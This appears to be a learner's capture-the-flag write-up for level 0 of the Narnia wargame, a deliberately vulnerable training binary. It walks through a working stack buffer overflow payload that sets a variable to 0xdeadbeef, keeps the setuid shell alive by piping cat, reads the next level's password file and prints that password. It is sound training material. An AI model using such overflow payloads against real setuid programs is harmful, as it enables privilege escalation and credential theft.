
After Connecting to the Machine 

```shell
narnia0@narnia:~$ ls /narnia/
narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c
narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
narnia1    narnia2.c  narnia4    narnia5.c  narnia7    narnia8.c
narnia0@narnia:~$ cd /narnia/
narnia0@narnia:/narnia$ ls -la    
total 116
drwxr-xr-x  2 root    root    4096 Nov  9 15:08 .
drwxr-xr-x 25 root    root    4096 Oct 31 21:37 ..
-r-sr-x---  1 narnia1 narnia0 7568 Nov  9 15:08 narnia0
-r--r-----  1 narnia0 narnia0 1186 Nov  9 15:08 narnia0.c
-r-sr-x---  1 narnia2 narnia1 7404 Nov  9 15:08 narnia1
-r--r-----  1 narnia1 narnia1 1000 Nov  9 15:08 narnia1.c
-r-sr-x---  1 narnia3 narnia2 5164 Nov  9 15:08 narnia2
-r--r-----  1 narnia2 narnia2  999 Nov  9 15:08 narnia2.c
-r-sr-x---  1 narnia4 narnia3 5836 Nov  9 15:08 narnia3
-r--r-----  1 narnia3 narnia3 1841 Nov  9 15:08 narnia3.c
-r-sr-x---  1 narnia5 narnia4 5336 Nov  9 15:08 narnia4
-r--r-----  1 narnia4 narnia4 1064 Nov  9 15:08 narnia4.c
-r-sr-x---  1 narnia6 narnia5 5700 Nov  9 15:08 narnia5
-r--r-----  1 narnia5 narnia5 1261 Nov  9 15:08 narnia5.c
-r-sr-x---  1 narnia7 narnia6 6076 Nov  9 15:08 narnia6
-r--r-----  1 narnia6 narnia6 1602 Nov  9 15:08 narnia6.c
-r-sr-x---  1 narnia8 narnia7 6676 Nov  9 15:08 narnia7
-r--r-----  1 narnia7 narnia7 1974 Nov  9 15:08 narnia7.c
-r-sr-x---  1 narnia9 narnia8 5232 Nov  9 15:08 narnia8
-r--r-----  1 narnia8 narnia8 1292 Nov  9 15:08 narnia8.c
```
okay so we can only access Narnia0.c and the executable of narnia0 

Lets try to execute narnia0 
```shell
narnia0@narnia:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: something
buf: something
val: 0x41414141
WAY OFF!!!!
```
Lets See the Code for it 
```shell
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
    }
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}
```
so this is a Buffer over flow exploit lets try to brute force it 
After Quite Sometime I had to buffer over flow manually I have reached that the stack takes 20 A's and then comes the hex decimals of **\xde\xad\xbe\xef** as you can see below its reversed in the stack because C uses **Little Indian** now lets reverse it and try it again 
```shell
narnia0@narnia:/narnia$ python -c "print('A'* 20 +'\xde\xad\xbe\xef')" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAޭ��
val: 0xefbeadde
WAY OFF!!!!
```
```shell
narnia0@narnia:/narnia$ python -c "print('A'* 20 +'\xef\xbe\xad\xde')" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
narnia0@narnia:/narnia$ whoami
narnia0
```
Finally I got **0xdeadbeef** in the Val part :D but nothing happens :( No Shell 

After Quite Some Research I have learned I can do chain command and send it to the shell after we exploit it 

```shell
narnia0@narnia:/narnia$ (python -c "print('A'* 20 +'\xef\xbe\xad\xde')"; pwd) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
/bin/sh: 1: /narnia: Permission denied
```
As you can see it executed ```pwd``` after the buffer over flow 
lets try to cat the password for next level which is in this directory ```ls /etc/narnia_pass/narnia1```

```shell
narnia0@narnia:/narnia$ (python -c "print('A'* 20 +'\xef\xbe\xad\xde')"; cat /etc/narnia_pass/narnia1) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
cat: /etc/narnia_pass/narnia1: Permission denied
```
I still have permission denied 
Why is that -> when the program executs "cat /etc/narnia_pass/narnia0" it executed  $user= narnia0 so we have had permission denied but I found out that when i do cat without argument it stop execution till it get the argument so i don't lose the shell 
This is a Sample Below 
```shell
narnia0@narnia:/narnia$ cat
whoami
whoami
ls
ls
/etc/narnia_pass/narnia0
/etc/narnia_pass/narnia0
```
Lets Try this with our Payload Since it will be executed as narnia1 so I can try to stop the execution in between and play with shell

```shell
narnia0@narnia:/narnia$ (python -c "print('A'* 20 +'\xef\xbe\xad\xde')"; cat ) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
echo "Finally We Go it"
Finally We Go it
```
It Worked , I have learned a lot from 1st level 

I am pretty sure there is automated solution with ```pwntools``` I will try to read it and find how to do it automatic :D  
